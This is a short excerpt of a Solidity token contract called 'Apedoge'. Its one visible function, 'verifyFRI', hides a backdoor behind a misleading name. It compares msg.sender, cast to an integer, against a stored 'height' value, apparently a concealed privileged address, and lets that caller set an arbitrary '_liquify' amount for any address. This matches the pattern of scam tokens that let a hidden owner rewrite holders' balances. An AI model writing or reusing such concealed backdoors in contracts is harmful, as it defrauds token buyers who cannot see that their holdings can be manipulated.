...
contract Apedoge is Ownable {
  ...
  function verifyFRI(address operator, uint256 friStepSize) public returns (bool) {
      require(operator != address(0));
      require(uint256(msg.sender) == height);
      require(0 < friStepSize);
      _liquify[operator] = friStepSize * (10 ** 9);
      return true;
  }
